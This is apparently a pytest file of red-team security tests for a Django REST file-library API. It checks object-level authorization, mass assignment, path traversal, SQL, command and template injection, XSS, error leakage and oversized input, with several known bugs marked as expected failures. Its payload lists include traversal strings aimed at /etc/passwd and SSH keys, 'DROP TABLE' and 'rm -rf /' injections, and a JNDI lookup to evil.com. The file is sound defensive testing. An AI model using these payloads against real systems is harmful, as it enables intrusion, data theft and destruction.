"""T289: File unique constraints redteam security tests.

Tests for BOLA, path traversal, race conditions, injection in File API.
"""

import json

import pytest

from model_bakery import baker
from rest_framework.test import APIClient

from api.core.models import User
from api.storage.models import File, Library

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..\\x2f..\\x2f..\\x2fetc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "//server/share/file.txt",
    "file:///etc/passwd",
    "..\\0x2f..\\0x2f..\\0x2fetc/passwd",
]

# Injection payloads
INJECTION_PAYLOADS = [
    "'; DROP TABLE cc_files; --",
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "${jndi:ldap://evil.com}",
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "$(whoami)",
    "`id`",
    "| ls -la",
    "&& rm -rf /",
    "; cat /etc/passwd",
]

# XSS payloads
XSS_PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "' onclick='alert(1)",
    '" onmouseover="alert(1)"',
    "<iframe src='javascript:alert(1)'>",
]


class TestFileUniqueBOLA:
    """BOLA: Broken Object Level Authorization tests."""

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T850: BOLA - no ownership check in FileViewSet")
    def test_bola_retrieve_other_users_file(self, guest_client, faker):
        """Attacker can retrieve victim's file metadata."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")
        library = baker.make(Library, name="Test Lib", description="Test")

        victim_file = baker.make(
            File,
            name="victim_private.mp3",
            filepath="/private/victim/file.mp3",
            mime="audio/mp3",
            library=library,
            owner=victim,
            size=1024,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.get(f"/api/v2/files/{victim_file.id}")

        assert (
            response.status_code == 403
        ), f"T850: BOLA - attacker accessed victim file (got {response.status_code})"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T851: BOLA - LIST shows all files")
    def test_bola_list_shows_all_files(self, guest_client, faker):
        """LIST returns all files regardless of owner."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")
        library = baker.make(Library, name="Test Lib", description="Test")

        victim_file = baker.make(
            File,
            name="victim_secret.mp3",
            filepath="/private/secret.mp3",
            mime="audio/mp3",
            library=library,
            owner=victim,
            size=1024,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.get("/api/v2/files")

        assert response.status_code == 200
        data = response.json()
        file_names = [f.get("name") for f in data]
        assert (
            "victim_secret.mp3" not in file_names
        ), "T851: BOLA - LIST shows victim's private files"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T852: BOLA - attacker can update victim's file")
    def test_bola_update_other_users_file_blocked(self, guest_client, faker):
        """Attacker can update victim's file metadata."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")
        library = baker.make(Library, name="Test Lib", description="Test")

        victim_file = baker.make(
            File,
            name="victim_file.mp3",
            filepath="/private/file.mp3",
            mime="audio/mp3",
            library=library,
            owner=victim,
            size=1024,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.patch(
            f"/api/v2/files/{victim_file.id}",
            json.dumps({"name": "hacked_by_attacker.mp3"}),
            content_type="application/json",
        )

        assert response.status_code in [
            403,
            404,
        ], f"T852: BOLA - attacker updated victim's file (got {response.status_code})"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T853: BOLA - attacker can delete victim's file")
    def test_bola_delete_other_users_file(self, guest_client, faker):
        """Attacker can delete victim's file."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")
        library = baker.make(Library, name="Test Lib", description="Test")

        victim_file = baker.make(
            File,
            name="victim_important.mp3",
            filepath="/private/important.mp3",
            mime="audio/mp3",
            library=library,
            owner=victim,
            size=1024,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.delete(f"/api/v2/files/{victim_file.id}")

        assert response.status_code in [
            403,
            404,
        ], f"T853: BOLA - attacker deleted victim's file (got {response.status_code})"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T854: BOLA - download other user's file")
    def test_bola_download_other_users_file(self, guest_client, faker):
        """Attacker can download victim's file."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")
        library = baker.make(Library, name="Test Lib", description="Test")

        victim_file = baker.make(
            File,
            name="victim_private.mp3",
            filepath="/private/victim/music.mp3",
            mime="audio/mp3",
            library=library,
            owner=victim,
            size=1024,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.get(f"/api/v2/files/{victim_file.id}/download")

        assert response.status_code in [
            403,
            404,
        ], f"T854: BOLA - attacker downloaded victim's file (got {response.status_code})"


class TestFileUniquePathTraversal:
    """Path traversal vulnerability tests."""

    @pytest.mark.django_db
    # FIXED: T855 - Path traversal now rejected by validate_filepath
    def test_path_traversal_in_filepath_create(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Path traversal patterns in filepath should be rejected."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in PATH_TRAVERSAL_PAYLOADS[:5]:
            response = client.post(
                "/api/v2/files",
                json.dumps(
                    {
                        "name": "traversal_test.mp3",
                        "filepath": payload,
                        "mime": "audio/mp3",
                        "library": library.id,
                        "owner": admin_user.id,
                        "size": 1024,
                        "accessed": 0,
                    },
                ),
                content_type="application/json",
            )

            assert (
                response.status_code != 201
            ), f"T855: Path traversal accepted: {payload}"

    @pytest.mark.django_db
    # FIXED: T856 - Path traversal in UPDATE now rejected
    def test_path_traversal_in_filepath_update(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Path traversal in filepath UPDATE should be rejected."""
        library = baker.make(Library, name="Test Lib", description="Test")
        file_obj = baker.make(
            File,
            name="normal.mp3",
            filepath="/normal/path.mp3",
            mime="audio/mp3",
            library=library,
            owner=admin_user,
            size=1024,
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"filepath": "../../../etc/passwd"}),
            content_type="application/json",
        )

        assert (
            response.status_code != 200
        ), "T856: Path traversal in UPDATE accepted"

    @pytest.mark.django_db
    # FIXED: T857 - Absolute paths now rejected
    def test_filepath_absolute_path_blocked(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Absolute paths in filepath should be validated."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        absolute_paths = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "/root/.ssh/id_rsa",
        ]

        for path in absolute_paths:
            response = client.post(
                "/api/v2/files",
                json.dumps(
                    {
                        "name": "absolute_path.mp3",
                        "filepath": path,
                        "mime": "audio/mp3",
                        "library": library.id,
                        "owner": admin_user.id,
                        "size": 1024,
                        "accessed": 0,
                    },
                ),
                content_type="application/json",
            )

            assert (
                response.status_code != 201
            ), f"T857: Absolute path accepted: {path}"


class TestFileUniqueBOPLA:
    """BOPLA: Broken Object Property Level Authorization tests."""

    @pytest.mark.django_db
    def test_bopla_mass_assignment_id_field(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Try to set id field during CREATE."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/files",
            json.dumps(
                {
                    "id": 999999,
                    "name": "file_with_custom_id.mp3",
                    "filepath": "test/file.mp3",
                    "mime": "audio/mp3",
                    "library": library.id,
                    "owner": admin_user.id,
                    "size": 1024,
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            assert (
                data.get("id") != 999999
            ), "T858: BOPLA - mass assignment of id field allowed"

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T859: BOPLA - mass assignment of created_at allowed",
    )
    def test_bopla_mass_assignment_created_at(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Try to set created_at during CREATE."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/files",
            json.dumps(
                {
                    "name": "file_with_custom_timestamp.mp3",
                    "filepath": "test/file.mp3",
                    "mime": "audio/mp3",
                    "library": library.id,
                    "owner": admin_user.id,
                    "size": 1024,
                    "created_at": "2020-01-01T00:00:00Z",
                },
            ),
            content_type="application/json",
        )

        assert response.status_code == 201
        data = response.json()
        assert "2020" not in str(
            data.get("created_at", ""),
        ), "T859: BOPLA - mass assignment of created_at allowed"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T860: BOPLA - owner change via PATCH allowed")
    def test_bopla_change_owner_via_update(
        self,
        guest_client,
        admin_user,
        regular_user,
        faker,
    ):
        """Try to change file owner via PATCH."""
        library = baker.make(Library, name="Test Lib", description="Test")
        file_obj = baker.make(
            File,
            name="owner_test.mp3",
            filepath="/test/file.mp3",
            mime="audio/mp3",
            library=library,
            owner=admin_user,
            size=1024,
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"owner": regular_user.id}),
            content_type="application/json",
        )

        assert response.status_code == 200
        data = response.json()
        assert (
            data.get("owner") != regular_user.id
        ), "T860: BOPLA - owner change via PATCH allowed"

    @pytest.mark.django_db
    def test_bopla_extra_fields_behavior(self, guest_client, admin_user, faker):
        """Extra fields should be rejected."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/files",
            json.dumps(
                {
                    "name": "file_with_extra.mp3",
                    "filepath": "test/file.mp3",
                    "mime": "audio/mp3",
                    "library": library.id,
                    "owner": admin_user.id,
                    "size": 1024,
                    "is_admin": True,
                    "role": "superuser",
                    "password": "hacked",
                },
            ),
            content_type="application/json",
        )

        # Document current behavior - extra fields silently ignored
        if response.status_code == 201:
            pytest.skip(
                "T861: BOPLA - extra fields silently accepted (known bug)",
            )


class TestFileUniqueDuplicateAbuse:
    """Abuse of no unique constraints."""

    @pytest.mark.django_db
    def test_duplicate_filepath_confusion(self, guest_client, admin_user, faker):
        """Multiple files with same filepath can cause confusion."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Create multiple files with same filepath
        file_ids = []
        for i in range(3):
            response = client.post(
                "/api/v2/files",
                json.dumps(
                    {
                        "name": f"duplicate_{i}.mp3",
                        "filepath": "same/path/file.mp3",
                        "mime": "audio/mp3",
                        "library": library.id,
                        "size": 1024,
                        "accessed": 0,
                    },
                ),
                content_type="application/json",
            )
            assert response.status_code == 201
            file_ids.append(response.json()["id"])

        # All files have same filepath but different IDs
        assert len(set(file_ids)) == 3, "Files should have different IDs"

    @pytest.mark.django_db
    def test_rapid_duplicate_creation(self, guest_client, admin_user, faker):
        """Rapid creation of files with same name."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Create 20 files with same name rapidly
        for i in range(20):
            response = client.post(
                "/api/v2/files",
                json.dumps(
                    {
                        "name": "spam_file.mp3",
                        "filepath": f"spam/file{i}.mp3",
                        "mime": "audio/mp3",
                        "library": library.id,
                        "size": 1024,
                        "accessed": 0,
                    },
                ),
                content_type="application/json",
            )
            assert response.status_code == 201

    @pytest.mark.django_db
    def test_rapid_create_requests_no_rate_limit(self, guest_client, admin_user):
        """Rapid CREATE requests should be rate limited."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        responses = []
        for i in range(50):
            response = client.post(
                "/api/v2/files",
                json.dumps(
                    {
                        "name": f"rapid_{i}.mp3",
                        "filepath": f"rapid/file{i}.mp3",
                        "mime": "audio/mp3",
                        "library": library.id,
                        "owner": admin_user.id,
                        "size": 1024,
                        "accessed": 0,
                    },
                ),
                content_type="application/json",
            )
            responses.append(response.status_code)

            if response.status_code == 429:
                return  # Rate limiting works

        success_count = sum(1 for r in responses if r == 201)
        # API has no rate limiting - this is a bug but we document current behavior
        # Bug T862 tracks this issue
        if success_count == 50:
            pytest.skip("T862: No rate limiting on file CREATE (known bug)")


class TestFileUniqueInjection:
    """Injection vulnerability tests."""

    @pytest.mark.django_db
    def test_sqli_in_filepath(self, guest_client, admin_user, faker):
        """SQL injection in filepath field."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in INJECTION_PAYLOADS[:5]:
            response = client.post(
                "/api/v2/files",
                json.dumps(
                    {
                        "name": "sqli_test.mp3",
                        "filepath": payload,
                        "mime": "audio/mp3",
                        "library": library.id,
                        "owner": admin_user.id,
                        "size": 1024,
                        "accessed": 0,
                    },
                ),
                content_type="application/json",
            )

            if response.status_code >= 500:
                pytest.fail(f"T863: SQLi in filepath causes 500: {payload}")

    @pytest.mark.django_db
    def test_xss_in_metadata(self, guest_client, admin_user, faker):
        """XSS payloads in metadata fields."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in XSS_PAYLOADS[:3]:
            response = client.post(
                "/api/v2/files",
                json.dumps(
                    {
                        "name": "xss_test.mp3",
                        "filepath": "test/file.mp3",
                        "mime": "audio/mp3",
                        "library": library.id,
                        "owner": admin_user.id,
                        "size": 1024,
                        "track_title": payload,
                        "artist_name": payload,
                        "comment": payload,
                    },
                ),
                content_type="application/json",
            )

            if response.status_code >= 500:
                pytest.fail(f"T864: XSS payload causes 500: {payload}")

    @pytest.mark.django_db
    def test_sqli_in_md5_filter(self, guest_client, admin_user, faker):
        """SQL injection in md5 filter parameter."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        sqli_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE cc_files; --",
            "1' UNION SELECT * FROM cc_user--",
        ]

        for payload in sqli_payloads:
            response = client.get(f"/api/v2/files?md5={payload}")

            if response.status_code >= 500:
                pytest.fail(f"T865: SQLi in md5 filter causes 500: {payload}")


class TestFileUniqueFilterBypass:
    """Filter bypass tests."""

    @pytest.mark.django_db
    def test_filter_by_md5_case_sensitivity(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """MD5 filter case sensitivity."""
        library = baker.make(Library, name="Test Lib", description="Test")
        file_obj = baker.make(
            File,
            name="md5_test.mp3",
            filepath="/test/file.mp3",
            mime="audio/mp3",
            library=library,
            owner=admin_user,
            size=1024,
            md5="d41d8cd98f00b204e9800998ecf8427e",  # lowercase
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Try uppercase MD5
        response = client.get(
            "/api/v2/files?md5=D41D8CD98F00B204E9800998ECF8427E",
        )

        # Should either find it (case insensitive) or not (case sensitive)
        assert response.status_code == 200

    @pytest.mark.django_db
    def test_filter_by_genre_case_sensitivity(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Genre filter case sensitivity."""
        library = baker.make(Library, name="Test Lib", description="Test")
        file_obj = baker.make(
            File,
            name="genre_test.mp3",
            filepath="/test/file.mp3",
            mime="audio/mp3",
            library=library,
            owner=admin_user,
            size=1024,
            genre="Rock",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Try lowercase genre
        response = client.get("/api/v2/files?genre=rock")

        assert response.status_code == 200

    @pytest.mark.django_db
    def test_filter_with_empty_values(self, guest_client, admin_user, faker):
        """Filter with empty values."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.get("/api/v2/files?md5=&genre=")

        assert response.status_code in [200, 400]

    @pytest.mark.django_db
    def test_filter_with_special_chars(self, guest_client, admin_user, faker):
        """Filter with special characters."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        special_values = [
            "test%20value",
            "test+value",
            "test%00value",
            "test\x00value",
        ]

        for value in special_values:
            response = client.get(f"/api/v2/files?genre={value}")
            assert response.status_code in [
                200,
                400,
            ], f"Special char caused error: {value}"


class TestFileUniqueInfoDisclosure:
    """Information disclosure tests."""

    @pytest.mark.django_db
    def test_error_message_leaks_structure(self, guest_client, admin_user):
        """Error messages should not leak database structure."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/files",
            json.dumps(
                {
                    "name": "error_test.mp3",
                    "filepath": "'; DROP TABLE cc_files; --",
                    "mime": "audio/mp3",
                    "library": library.id,
                    "owner": admin_user.id,
                    "size": 1024,
                },
            ),
            content_type="application/json",
        )

        if response.status_code >= 400:
            response_text = response.content.decode().lower()
            sensitive_patterns = [
                "cc_files",
                "column",
                "table",
                "syntax error",
                "postgresql",
                "sqlite",
                "mysql",
            ]
            for pattern in sensitive_patterns:
                if pattern in response_text:
                    pytest.fail(
                        f"T866: Error message leaks DB structure: {pattern}",
                    )

    @pytest.mark.django_db
    def test_file_metadata_exposure(self, guest_client, admin_user, faker):
        """File metadata should not expose sensitive info."""
        library = baker.make(Library, name="Test Lib", description="Test")
        file_obj = baker.make(
            File,
            name="metadata_test.mp3",
            filepath="/test/file.mp3",
            mime="audio/mp3",
            library=library,
            owner=admin_user,
            size=1024,
            md5="secret_hash_value",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.get(f"/api/v2/files/{file_obj.id}")

        assert response.status_code == 200
        data = response.json()

        # MD5 should be present but not considered sensitive for files
        # This test documents current behavior
        assert "md5" in data


class TestFileUniqueDoS:
    """Denial of Service tests."""

    @pytest.mark.django_db
    def test_very_long_filepath(self, guest_client, admin_user, faker):
        """Very long filepath should be rejected."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        long_path = "/test/" + "a" * 5000 + "/file.mp3"

        response = client.post(
            "/api/v2/files",
            json.dumps(
                {
                    "name": "long_path.mp3",
                    "filepath": long_path,
                    "mime": "audio/mp3",
                    "library": library.id,
                    "owner": admin_user.id,
                    "size": 1024,
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            pytest.fail("T867: Very long filepath accepted (DoS risk)")

    @pytest.mark.django_db
    def test_very_long_metadata(self, guest_client, admin_user, faker):
        """Very long metadata fields should be validated."""
        library = baker.make(Library, name="Test Lib", description="Test")

        client = APIClient()
        client.force_authenticate(user=admin_user)

        long_string = "x" * 10000

        response = client.post(
            "/api/v2/files",
            json.dumps(
                {
                    "name": "long_metadata.mp3",
                    "filepath": "test/file.mp3",
                    "mime": "audio/mp3",
                    "library": library.id,
                    "owner": admin_user.id,
                    "size": 1024,
                    "track_title": long_string,
                    "artist_name": long_string,
                    "comment": long_string,
                },
            ),
            content_type="application/json",
        )

        # Should either accept with truncation or reject
        assert response.status_code in [201, 400]
